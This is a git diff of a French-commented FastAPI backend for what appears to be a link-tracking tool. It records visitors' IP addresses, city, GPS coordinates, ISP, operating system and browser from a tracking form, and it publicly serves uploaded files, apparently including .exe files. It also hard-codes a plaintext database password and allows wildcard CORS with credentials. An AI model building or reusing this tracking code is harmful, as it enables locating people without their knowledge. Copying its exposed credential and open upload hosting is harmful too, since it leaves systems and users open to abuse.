@@ -1,41 +1,41 @@
 from fastapi import FastAPI, UploadFile, File, HTTPException
 from fastapi.responses import JSONResponse
 from fastapi.staticfiles import StaticFiles
+from fastapi.middleware.cors import CORSMiddleware  # CORS
+
 from pydantic import BaseModel
 import os
 import shutil
 import psycopg2
+from psycopg2.extras import RealDictCursor
 
-# === CONFIGURATION GÉNÉRALE ===
+# === CONFIGURATION DE L'APPLICATION ===
 app = FastAPI()
+
+# ✅ Autoriser les requêtes cross-origin (CORS)
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["*"],  # Remplace par ["https://trackerethique.netlify.app"] pour + de sécurité
+    allow_credentials=True,
+    allow_methods=["*"],
+    allow_headers=["*"],
+)
+
+# === CONFIG UPLOAD FICHIERS ===
 UPLOAD_DIR = os.path.abspath("uploaded_files")
 os.makedirs(UPLOAD_DIR, exist_ok=True)
+BASE_URL = os.getenv("BASE_URL", "https://tracksys-backend.onrender.com")
 
-BASE_URL = os.getenv("BASE_URL", "http://localhost:8000")
-
+# === CONFIGURATION DE LA BASE POSTGRESQL ===
 DB_CONFIG = {
-    "host": "tracksys_bd.onrender.com",
+    "host": "tracksys_bd.render.com",  # Remplace par ton host réel Render
     "dbname": "tracksys_bd",
     "user": "postgres",
-    "password": "Boucledor",
+    "password": "Boucledor",  # Remplace avec précaution
     "port": 5432
 }
 
-# === Fonction pour récupérer le dernier id_lien ===
-def get_last_inserted_lien_id():
-    try:
-        conn = psycopg2.connect(**DB_CONFIG)
-        cur = conn.cursor()
-        cur.execute("SELECT id_lien FROM liens ORDER BY id_lien DESC LIMIT 1")
-        result = cur.fetchone()
-        cur.close()
-        conn.close()
-        return result[0] if result else None
-    except Exception as e:
-        print(f"Erreur récupération id_lien : {e}")
-        return None
-
-# === ROUTE POUR UPLOAD .ZIP ou .EXE ===
+# === ROUTE POUR L’UPLOAD DE FICHIERS ===
 @app.post("/upload/")
 async def upload_file(file: UploadFile = File(...)):
     try:
@@ -47,13 +47,14 @@ async def upload_file(file: UploadFile = File(...)):
 
         file_url = f"{BASE_URL}/files/{filename}"
         return JSONResponse(content={"filename": filename, "url": file_url})
+
     except Exception as e:
         raise HTTPException(status_code=500, detail=str(e))
 
-# === Servir les fichiers statiques ===
+# === RENDRE LES FICHIERS ACCESSIBLES EN PUBLIC ===
 app.mount("/files", StaticFiles(directory=UPLOAD_DIR), name="files")
 
-# === MODÈLE POUR LES DONNÉES DU FORMULAIRE DE TRACKING ===
+# === ROUTE DE RÉCEPTION DES DONNÉES COLLECTÉES PAR FORM.HTML ===
 class CollecteData(BaseModel):
     ip: str
     ville: str
@@ -67,16 +68,11 @@ class CollecteData(BaseModel):
     resolution: str
     fuseau: str
     date: str
-    image_vue: str = None  # null pour lien simple
+    image_vue: str = None  # Peut être null (lien simple)
 
-# === ROUTE DE RÉCEPTION DES INFOS COLLECTÉES ===
 @app.post("/collecte")
 async def collecter_infos(data: CollecteData):
     try:
-        id_lien = get_last_inserted_lien_id()
-        if id_lien is None:
-            raise HTTPException(status_code=400, detail="Aucun lien trouvé dans la base.")
-
         conn = psycopg2.connect(**DB_CONFIG)
         cur = conn.cursor()
 
@@ -86,7 +82,7 @@ async def collecter_infos(data: CollecteData):
                 fai, os, navigateur, resolution, fuseau, date_collecte, image_vue
             ) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
         """, (
-            id_lien,
+            1,  # Remplacer par le vrai ID du lien si dispo
             data.ip, data.ville, data.region, data.pays,
             data.latitude, data.longitude, data.fai,
             data.os, data.navigateur, data.resolution,
@@ -96,8 +92,7 @@ async def collecter_infos(data: CollecteData):
         conn.commit()
         cur.close()
         conn.close()
-
-        return {"status": "success", "message": "Collecte enregistrée avec succès"}
+        return {"status": "success", "message": "Collecte enregistrée dans la base"}
 
     except Exception as e:
         return JSONResponse(status_code=500, content={"error": str(e)})
